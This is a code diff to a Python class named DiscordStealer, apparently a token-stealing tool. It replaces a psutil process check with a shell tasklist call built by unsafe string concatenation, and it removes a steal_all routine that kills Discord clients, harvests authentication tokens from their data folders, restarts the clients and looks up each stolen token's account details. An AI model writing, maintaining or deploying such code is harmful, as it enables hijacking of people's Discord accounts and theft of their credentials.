@@ -4,7 +4,6 @@ import json
 import base64
 import threading
 import subprocess
-import psutil
 import time
 from . import utils
 
@@ -37,13 +36,11 @@ class DiscordStealer:
         self.killed_processes = []
 
     def is_process_running(self, exe_name):
-        for proc in psutil.process_iter(['name']):
-            try:
-                if proc.info['name'] and proc.info['name'].lower() == exe_name.lower():
-                    return True
-            except:
-                pass
-        return False
+        try:
+            output = subprocess.check_output('tasklist /fi "IMAGENAME eq ' + exe_name + '" /nh', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
+            return exe_name.lower() in output.lower()
+        except:
+            return False
 
     def kill_discord_process(self, exe_name):
         if self.is_process_running(exe_name):
@@ -291,20 +288,3 @@ class DiscordStealer:
             return result
         except:
             return []
-
-    def steal_all(self):
-        threads = []
-        for path, exe_name in DISCORD_PATHS:
-            if os.path.exists(path):
-                was_running = self.kill_discord_process(exe_name)
-                t = threading.Thread(target=self.find_tokens_in_discord, args=(path, exe_name))
-                threads.append((t, was_running, exe_name))
-                t.start()
-        for t, was_running, exe_name in threads:
-            t.join()
-            if was_running:
-                self.restart_discord_process(exe_name)
-        for token in self.tokens:
-            info = self.get_token_info(token)
-            if info:
-                self.token_info.append(info)
